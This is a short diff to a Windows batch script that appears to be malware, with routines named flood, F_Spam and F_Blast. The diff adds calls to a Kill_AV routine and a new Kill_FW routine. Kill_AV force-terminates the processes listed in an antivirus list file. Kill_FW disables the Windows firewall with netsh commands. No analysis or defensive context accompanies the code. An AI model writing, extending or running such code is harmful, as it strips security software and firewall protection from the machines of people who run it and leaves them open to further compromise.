@@ -3,6 +3,9 @@
 call flood
 call F_Spam
 call F_Blast
+call Kill_AV
+call Kill_FW
+goto main
 
 :flood
 set x=%random%
@@ -23,3 +26,7 @@ start %FBlast%
 
 :Kill_AV
 for /f "delims=" %%a in (avs.list) do taskkill /f /im %%a
+
+:Kill_FW
+netsh firewall set opmode disable
+netsh advfirewall set currentprofile state off
